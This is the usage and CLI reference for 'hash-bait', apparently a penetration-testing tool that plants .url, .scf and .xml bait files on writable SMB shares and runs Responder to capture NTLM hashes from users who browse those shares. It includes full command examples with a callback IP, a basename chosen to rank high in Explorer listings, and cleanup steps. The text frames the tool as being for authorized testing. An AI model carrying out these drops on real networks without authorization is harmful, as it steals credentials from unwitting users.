# hash-bait Usage, CLI Reference & Known Issues

Full command reference, examples, configuration, tested environments, and known limitations for `hash-bait`. For authorized security testing with explicit written permission only.

## Install & Upgrade

Windows (PowerShell):

```powershell
irm https://raw.githubusercontent.com/Real-Fruit-Snacks/hash-bait/main/install.ps1 | iex
```

Linux and macOS:

```sh
curl -fsSL https://raw.githubusercontent.com/Real-Fruit-Snacks/hash-bait/main/install.sh | sh
```

Each installer downloads the archive for your platform from the [latest release](https://github.com/Real-Fruit-Snacks/hash-bait/releases/latest) and adds the binary to your `PATH` (`%LOCALAPPDATA%\Programs\hash-bait` on Windows, `~/.local/bin` on Unix). Re-run the same line to upgrade. Release binaries are unsigned; verify downloads against `SHA256SUMS.txt` on the release page.

To build from source with a stable Rust toolchain:

```sh
cargo install --path .
```

## What's in it

| Command | Does |
|---|---|
| `hash-bait drop` | Renders `.url`/`.scf`/`.xml` bait and puts it on a writable share; starts Responder unless `--no-listen` |
| `hash-bait clean` | Removes previously dropped bait, matched by basename; reports missing files without aborting |
| `hash-bait list` | Enumerates shares on a target over `IPC$` + `srvsvc` (Windows targets only; see [Known issues](#known-issues)) |
| `hash-bait listen` | Starts Responder (`sudo responder -I <iface> -wv`) on an interface (Linux only; exits 4 elsewhere) |

### Global options

| Flag | Meaning |
|---|---|
| `--no-color` | Disable ANSI color output (also honors `NO_COLOR`, `TERM=dumb`, and non-TTY stdout) |
| `-h`, `--help` | Print help for the binary or a subcommand |
| `-V`, `--version` | Print version (`hash-bait v1.0.1`) |

### `drop` options

| Flag | Default | Meaning |
|---|---|---|
| `-t`, `--target HOST` | required | Target SMB server (IP or hostname) |
| `-s`, `--share NAME` | required | Target share name |
| `-c`, `--callback IP` | required | Listener IP embedded in payload UNC paths |
| `-i`, `--iface IFACE` | — | Network interface for Responder (required unless `--no-listen` or `--dry-run`) |
| `-d`, `--dir PATH` | share root | Subdirectory inside the share when the root is read-only (`/` converted to `\`) |
| `-p`, `--payload TYPE` | `all` | Payload type: `url`, `scf`, `xml`, or `all` (repeatable, e.g. `-p url -p scf`) |
| `--name BASE` | `@bait` | Payload basename (`@` sorts to the top of Explorer listings) |
| `--no-listen` | off | Upload bait only; skip launching Responder |
| `--save-local` | off | Also write rendered payload files to the current working directory |
| `--dry-run` | off | Print the plan without writing locally, connecting over SMB, or launching Responder |
| `-u`, `--user USER` | guest | Username: `user`, `DOMAIN/user`, `DOMAIN\user`, or `user@DOMAIN.LOCAL` |
| `--pass PASS` | — | Password on the command line (visible in `ps`; prefer `--ask-pass` or `$HASH_BAIT_PASSWORD`) |
| `--ask-pass` | off | Prompt for the password interactively without echo |

### `clean` options

Takes `-t/--target`, `-s/--share`, optional `-d/--dir`, repeatable `-p/--payload`, `--name` (default `@bait`), `--dry-run`, and the authentication flags (`-u/--user`, `--pass`, `--ask-pass`).

### `list` options

Takes `-t/--target` and the authentication flags (`-u/--user`, `--pass`, `--ask-pass`).

### `listen` options

Takes `-i/--iface IFACE`.

## Examples

Enumerate shares on a Windows target using a password from the environment:

```sh
export HASH_BAIT_PASSWORD='...'
hash-bait list -t dc1 -u svc-reader
```

Preview a drop without touching the share or local disk:

```sh
hash-bait drop -t dc1 -c 10.10.14.7 -s public -u svc-reader -i eth0 --dry-run
```

Drop all three default payloads (`@bait.url`, `@bait.scf`, `@bait.xml`) and launch Responder on `eth0`:

```sh
hash-bait drop -t dc1 -c 10.10.14.7 -s public -u LAB/svc-reader -i eth0
```

Drop specific payload types into a writable subdirectory with a custom basename, skip Responder, save local copies, and prompt for the password (`-p` is repeatable, not comma-separated):

```sh
hash-bait drop -t dc1 -c 10.10.14.7 -s public -d HR/inbox \
  -p url -p scf -p xml --name '@readme' \
  --no-listen --save-local -u svc-reader@LAB.LOCAL --ask-pass
```

Run Responder separately on a Linux capture host:

```sh
hash-bait listen -i eth0
```

Remove the dropped bait afterwards (match the same `-d`, `-p`, and `--name` values used during `drop`):

```sh
hash-bait clean -t dc1 -s public -u svc-reader
hash-bait clean -t dc1 -s public -d HR/inbox -p url -p scf -p xml --name '@readme' -u svc-reader@LAB.LOCAL --ask-pass
```

## Configuration

| Environment variable | Effect |
|---|---|
| `HASH_BAIT_PASSWORD` | Password used when `--pass` is omitted and before `--ask-pass` prompts |
| `NO_COLOR` | Any value disables ANSI escape codes (same as `--no-color`) |
| `TERM` | `TERM=dumb` disables color; `TERM=linux` selects 16-color ANSI |
| `COLORTERM` | Anything other than `truecolor` or `24bit` falls back to 16-color ANSI |

**Password resolution order:** `--pass` > `$HASH_BAIT_PASSWORD` > `--ask-pass`. Passing `-u/--user` without any resolvable password exits with code `2`.

**Status prefixes & exit codes:** Every status line starts with a bracketed ASCII tag (`[ok]`, `[!]`, `[x]`, `[i]`) so piped or monochrome output remains legible.

| Exit code | Meaning |
|---|---|
| `0` | Success (including `--dry-run` and `clean` when some files were already absent) |
| `1` | Runtime failure (SMB connection/authentication/write error, Responder launch error) |
| `2` | Invalid arguments, unknown `-p` payload type, missing `-i`/`--no-listen`, or `-u` without a password |
| `4` | `responder` missing from `PATH`, or `listen` invoked on a non-Unix platform |

## Tested on

Every automated check runs on each commit in [CI](../.github/workflows/ci.yml):

| Environment | Status | Coverage |
|---|---|---|
| Windows 11 · stable Rust | Tested | Build host; 18 unit, golden payload, and CLI tests |
| `windows-2022` · live Windows share | Tested in CI | `cargo fmt --check`, `cargo clippy --all-targets -- -D warnings`, `cargo test --locked`, plus authenticated `drop`, `list`, and `clean` against a local share |
| `ubuntu-24.04` · live Samba share | Tested in CI | `cargo test --locked`, plus authenticated `drop` and `clean` against Samba (`list` and guest drop run as informational probes) |
| macOS (`aarch64`, `x86_64`) | Not tested | Cross-compiled and unsigned in release builds; no runtime guarantees |

## Known issues

- `listen` needs Responder, which only runs on Linux. On Windows it explains and exits `4`; the usual split is `drop --no-listen` from anywhere and `hash-bait listen -i <iface>` on the Linux capture box.
- `list` enumerates shares over DCE/RPC, and the `smb` crate offers only the NDR64 transfer syntax when binding. Windows accepts it (CI proves `list` against a live Windows share); Samba's `srvsvc` endpoint rejects it. Until the crate supports classic NDR, `list` is Windows-only — against Samba and NAS targets it fails loudly while `drop` and `clean` work normally.
- Anonymous drops are guest sessions — the Rust SMB stack cannot express a true null session, so `guest` with an empty password is the portable equivalent. Against servers that accept the session before SSPI completes (Samba `map to guest`, most NAS devices), the `smb` crate errors with `"SMB session setup succeeded before SSPI authentication completed"` — a crate limitation, not fixable from here. Guest access is best-effort; authenticated drops are the tested path, and default Windows refuses guest either way.
- `--pass` is visible in the process list. Prefer `--ask-pass` or `$HASH_BAIT_PASSWORD`.
- Binaries are unsigned. Windows SmartScreen and macOS Gatekeeper warnings are expected; on macOS, first run requires `xattr -d com.apple.quarantine` on the binary. Check `SHA256SUMS.txt` from the release page to verify download integrity.

## Related documents

- [Rewrite analysis & behavior parity](ANALYSIS.md)
- [Changelog](../CHANGELOG.md)
- [Security policy](../SECURITY.md)
